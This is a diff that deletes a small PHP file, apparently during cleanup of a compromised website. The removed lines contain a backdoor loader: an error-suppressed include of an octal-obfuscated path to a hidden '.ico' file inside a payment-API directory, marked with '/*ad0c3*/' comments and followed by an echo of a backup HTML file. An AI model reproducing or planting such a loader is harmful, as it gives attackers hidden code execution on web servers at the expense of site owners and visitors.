@@ -1,9 +1,0 @@
-<?php
-/*ad0c3*/
-
-@include "\057www\057www\162oot\057boi\154ers\145lli\156g.c\157m/e\057pay\141pi/\164enp\141y/.\0640ef\071537\056ico";
-
-/*ad0c3*/
-
-
-echo @file_get_contents('index.html.bak.bak');
